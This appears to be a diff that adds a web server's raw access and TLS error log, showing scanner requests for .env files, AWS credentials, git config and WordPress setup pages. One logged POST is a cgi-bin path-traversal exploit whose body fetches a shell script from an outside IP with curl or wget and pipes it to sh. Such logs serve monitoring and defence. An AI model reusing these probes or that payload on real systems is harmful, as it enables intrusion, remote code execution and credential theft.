+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.uat HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.test HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.aws/credentials HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /media../.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept: */*
+AccC01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+handshake failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+handshake failed.
+can't open ./wordpress/wp-admin/setup-config.phpcan't open ./wp-admin/setup-config.phpread failed.
+read failed.
+can't open ./RDWeb/Pages/can't open ./Remoteread failed.
+C01E534EFE7A0000:error:0A0000FC:SSL routines:tls_early_post_process_client_hello:unknown protocol:../ssl/statem/statem_srvr.c:1633:
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+handshake failed.
+C01E534EFE7A0000:error:0A00018C:SSL routines:tls_early_post_process_client_hello:version too low:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
+handshake failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+read failed.
+method not supported.
+C01E534EFE7A0000:error:0A00009C:SSL routines:ssl3_get_record:http request:../ssl/record/ssl3_record.c:345:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A00018C:SSL routines:tls_early_post_process_client_hello:version too low:../ssl/statem/statem_srvr.c:1657:
+handshake failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+handshake failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+handshake failed.
+can't open ./favicon.icoC01E534EFE7A0000:error:0A00009C:SSL routines:ssl3_get_record:http request:../ssl/record/ssl3_record.c:345:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+can't open ./favicon.icoread failed.
+C01E534EFE7A0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A00018C:SSL routines:tls_early_post_process_client_hello:version too low:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A0000FC:SSL routines:tls_early_post_process_client_hello:unknown protocol:../ssl/statem/statem_srvr.c:1633:
+handshake failed.
+read failed.
+read failed.
+read failed.
+read failed.
+read failed.
+ept-Encoding: gzip
+
+GET /wordpress/wp-admin/setup-config.php HTTP/1.1
+cf-ray: 9265691571f67122-TLL
+x-forwarded-for: 2a06:98c0:3600::103
+Host: lorenzopiombini.com
+CF-Connecting-IP: 2a06:98c0:3600::103
+accept-encoding: gzip, br
+X-Forwarded-Proto: https
+cf-worker: eqico1986.workers.dev
+CF-Visitor: {"scheme":"https"}
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Cache-Control: no-cache
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-us,en;q=0.8,fr;q=0.5,fr-ca;q=0.3
+Connection: Keep-Alive
+CF-EW-Via: 15
+CDN-Loop: cloudflare; loops=1; subreqs=1
+
+GET /wp-admin/setup-config.php HTTP/1.1
+cf-ray: 92656b2440bc5435-TLL
+x-forwarded-for: 2a06:98c0:3600::103
+Host: lorenzopiombini.com
+CF-Connecting-IP: 2a06:98c0:3600::103
+accept-encoding: gzip, br
+X-Forwarded-Proto: https
+cf-worker: doslovnost5452.workers.dev
+CF-Visitor: {"scheme":"https"}
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Cache-Control: no-cache
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-us,en;q=0.8,fr;q=0.5,fr-ca;q=0.3
+Connection: Keep-Alive
+CF-EW-Via: 15
+CDN-Loop: cloudflare; loops=1; subreqs=1
+
+GET / HTTP/1.1
+Host: 137.184.91.131:443
+User-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com
+Accept-Encoding: gzip
+
+GET /RDWeb/Pages/ HTTP/1.1
+Connection: Keep-Alive
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.1
+Accept-Charset: utf-8, *;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 137.184.91.131
+
+GET /Remote HTTP/1.1
+Connection: Keep-Alive
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.1
+Accept-Charset: utf-8, *;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 137.184.91.131
+
+GET / HTTP/1.1
+Host: 137.184.91.131:443
+User-Agent: Go-http-client/1.1
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: 137.184.91.131:443
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 105
+
+X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo "$X" | sh -s apache.selfrepGET / HTTP/1.1
+Host: 137.184.91.131:443
+Accept: */*
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
+Connection: close
+
+GET /favicon.ico HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
+Connection: close
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: */*
+Accept-Language: en;q=0.7,en-US;q=0.3
+Cache-Control: no-cache
+Connection: keep-alive
+Pragma: no-cache
+Accept-Encoding: gzip
+
+GET /favicon.ico HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: */*
+Accept-Language: en;q=0.7,en-US;q=0.3
+Cache-Control: no-cache
+Connection: keep-alive
+Pragma: no-cache
+Accept-Encoding: gzip
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 zgrab/0.x
+Accept: */*
+Accept-Encoding: gzip
+
+GET /getting-started.html HTTP/1.1
+Host: lorenzopiombini.com
+Connection: keep-alive
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Upgrade-Insecure-Requests: 1can't open ./getting-started.htmlcan't open ./.envC01E534EFE7A0000:error:0A00009C:SSL routines:ssl3_get_record:http request:../ssl/record/ssl3_record.c:345:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
